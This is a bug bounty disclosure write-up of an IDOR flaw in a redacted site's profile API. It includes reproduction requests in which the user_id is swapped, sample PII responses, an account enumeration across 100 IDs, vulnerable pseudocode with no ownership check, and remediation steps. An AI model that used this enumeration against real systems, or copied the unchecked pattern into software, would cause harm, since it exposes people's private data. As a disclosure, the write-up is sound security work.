# IDOR (Unauthorized Access to User Profile Data)

**Vulnerability Type:** Insecure Direct Object Reference (IDOR)<br>
**Severity:** High (CVSS 3.1 Score: 7.5)<br>
**Platform:** Bug Bounty (Redacted)<br>
**Status:** Resolved / Disclosed<br>
**Date:** 2024

---

## Summary

While testing a web application's user profile functionality, I discovered that the API endpoint used to fetch user profile data relied solely on a numeric user ID passed in the URL. There was no server-side authorization check to verify whether the authenticated user had permission to access the requested resource. This allowed any authenticated user to view the private profile data of any other user by simply modifying the `user_id` parameter.

---

## Vulnerability Details

| Field | Details |
|---|---|
| Type | IDOR — Broken Object Level Authorization |
| Endpoint | `GET /api/v1/users/{user_id}/profile` |
| Authentication Required | Yes (any valid session) |
| Impact | Unauthorized read access to PII (name, email, phone, address) |
| CVSS Vector | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N |

---

## Steps to Reproduce

### 1. Log in as a normal user

Create or log into any valid account. Capture your session token or cookie using Burp Suite.

### 2. Access your own profile

Navigate to your profile page. Intercept the request in Burp Suite:

```
GET /api/v1/users/1042/profile HTTP/1.1
Host: redacted.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

The server responds with your profile data:

```json
{
  "user_id": 1042,
  "name": "Danish",
  "email": "danish@email.com",
  "phone": "+92-300-1234567",
  "address": "Islamabad, Pakistan"
}
```

### 3. Modify the user_id parameter

Send the same request to Burp Repeater. Change `1042` to any other integer value, for example `1001`:

```
GET /api/v1/users/1001/profile HTTP/1.1
Host: redacted.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### 4. Observe the response

The server returns the private profile data of user `1001` without any authorization error:

```json
{
  "user_id": 1001,
  "name": "Abbas",
  "email": "abbas@email.com",
  "phone": "+1-555-987-6543",
  "address": "New York, USA"
}
```

No `403 Forbidden` or ownership check was performed.

### 5. Enumerate further

By iterating the `user_id` parameter from `1000` to `1100`, I was able to retrieve profile data for all 100 accounts in that range. I stopped enumeration after confirming the issue and did not retain or use any of the data retrieved.

---

## Impact

An attacker could:
- Enumerate all registered user IDs and harvest PII at scale
- Use collected emails and phone numbers for phishing or social engineering attacks
- Target high-privilege accounts (admins, staff) by enumerating IDs near known admin accounts
- Violate GDPR and applicable data protection regulations

---

## Root Cause

The application performed authentication (verified a valid session existed) but did not perform **authorization** (verify the authenticated user owned the requested resource). This is a classic BOLA (Broken Object Level Authorization) flaw, listed as **OWASP API Security Top 10: API1**.

The server-side logic likely resembled:

```python
# Vulnerable pseudocode
@app.route('/api/v1/users/<user_id>/profile')
@require_auth
def get_profile(user_id):
    return db.query("SELECT * FROM users WHERE id = ?", user_id)
    # Missing: if user_id != current_user.id: return 403
```

---

## Remediation

1. **Enforce object-level authorization** — Verify that `user_id` in the request matches the authenticated user's session ID before returning data.
2. **Use indirect references** — Replace sequential integer IDs with non-guessable UUIDs (e.g., `a3f8c2d1-...`) to reduce enumeration risk.
3. **Implement centralized authorization middleware** — Apply ownership checks at the framework level rather than per-endpoint to avoid inconsistent coverage.
4. **Rate limiting** — Limit API requests per session to slow down enumeration attempts.

---

## References

- [OWASP API Security Top 10 — API1: Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [PortSwigger — IDOR](https://portswigger.net/web-security/access-control/idor)
- [HackTricks — IDOR](https://book.hacktricks.xyz/pentesting-web/idor)

---

*This writeup is published for educational purposes. All testing was conducted within the scope of an authorized bug bounty program. No user data was retained.*
